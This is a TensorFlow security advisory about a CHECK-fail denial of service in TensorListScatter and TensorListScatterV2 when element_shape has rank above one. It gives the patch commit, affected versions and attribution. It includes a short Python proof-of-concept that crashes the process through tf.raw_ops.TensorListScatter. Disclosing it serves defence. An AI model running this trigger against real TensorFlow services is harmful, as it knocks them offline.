summary: "TensorFlow vulnerable to `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`\n\
  ### Impact\nWhen `TensorListScatter` and `TensorListScatterV2` receive an `element_shape`\
  \ of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service\
  \ attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16,\
  \ maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2,\
  \ 2, 2), dtype=tf.int32, maxval=65536)\narg_3=''\ntf.raw_ops.TensorListScatter(tensor=arg_0,\
  \ indices=arg_1, \nelement_shape=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the\
  \ issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).\n\
  \nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow\
  \ 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported\
  \ range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)\
  \ for more information regarding the security model and how to contact us with issues and\
  \ questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information\
  \ System & Security and Countermeasures Experiments Center, Beijing Institute of Technology."
